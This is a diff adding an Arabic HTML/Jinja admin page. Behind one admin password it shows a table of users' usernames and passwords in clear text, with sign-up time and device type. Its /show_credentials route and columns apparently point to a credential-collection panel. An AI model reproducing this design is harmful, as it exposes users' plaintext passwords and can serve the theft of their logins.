@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معلومات المستخدمين</title>
+    <style>
+        body {
+            background-color: #333;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        table {
+            width: 90%;
+            margin: auto;
+            border-collapse: collapse;
+            background-color: #444;
+            display: none; /* إخفاء الجدول بشكل افتراضي */
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #ccc;
+        }
+        th {
+            background-color: #555;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #555;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #666;
+        }
+        .admin-password {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>معلومات المستخدمين</h1>
+
+<!-- إدخال كلمة المرور -->
+<form action="/show_credentials" method="POST" class="admin-password">
+    <input type="password" name="admin_password" placeholder="أدخل كلمة مرور الإدارة" required style="padding: 10px; width: 80%; max-width: 300px;">
+    <button type="submit">دخول</button>
+</form>
+
+<table id="user-table">
+    <thead>
+        <tr>
+            <th>اسم المستخدم وكلمة السر</th>
+            <th>توقيت التسجيل</th>
+            <th>نوع الجهاز</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for user in result %}
+            <tr>
+                <td>{{ user[0] }}</td>
+                <td>{{ user[1] }}</td>
+                <td>{{ user[2] }}</td>
+            </tr>
+        {% endfor %}
+    </tbody>
+</table>
+
+<script>
+    // عرض الجدول فقط بعد إدخال كلمة المرور الصحيحة
+    if ({{ result|length }} > 0) {
+        document.getElementById('user-table').style.display = 'table';
+    }
+</script>
+
+<a href="/" style="text-decoration: none;">
+    <button>العودة إلى الصفحة الرئيسية</button>
+</a>
+
+</body>
+</html>
